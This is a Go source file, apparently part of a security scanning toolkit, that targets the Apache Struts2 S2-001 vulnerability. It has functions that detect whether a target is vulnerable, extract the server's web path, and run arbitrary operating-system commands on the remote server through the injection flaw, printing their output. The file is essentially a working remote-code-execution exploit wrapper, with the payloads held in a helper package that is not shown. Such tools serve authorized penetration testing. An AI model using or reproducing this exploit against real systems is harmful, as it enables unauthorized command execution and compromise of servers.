package s2_001

import (
    "fmt"
    "github.com/fatih/color"
    "github.com/yhy0/ChYing/pkg/Jie/scan/Pocs/java/struts2/utils"
    "net/url"
    "strings"
)

func Check(targetUrl string, postData string) {
    respStrings := utils.PostFunc4Struts2(targetUrl, postData, "", utils.POC_s001_check)
    if utils.IfContainsStr(respStrings, "6308") {
        color.Red("*Found Struts2-001！")
    } else {
        fmt.Println("Struts2-001 Not Vulnerable.")
    }
}
func GetWebPath(targetUrl string, postData string) {
    respStrings := utils.PostFunc4Struts2(targetUrl, postData, "", utils.POC_s001_webpath)
    webpath := utils.GetBetweenStr(respStrings, "s001webpathstart", "s001webpathend")[16:]
    color.Green(webpath)
}
func ExecCommand(targeturl string, command string, postData string) {
    respStrings := utils.PostFunc4Struts2(targeturl, postData, "", utils.POC_s001_exec(command))
    // 下面步骤清洗数据，主要是去掉空字符，输出块大小可以在poc中调节
    respStrings = strings.Replace(url.QueryEscape(respStrings), "%00", "", -1)
    execResult := utils.GetBetweenStr(respStrings, "s001execstart", "s001execend")
    fmt.Println(url.QueryUnescape(execResult))
}
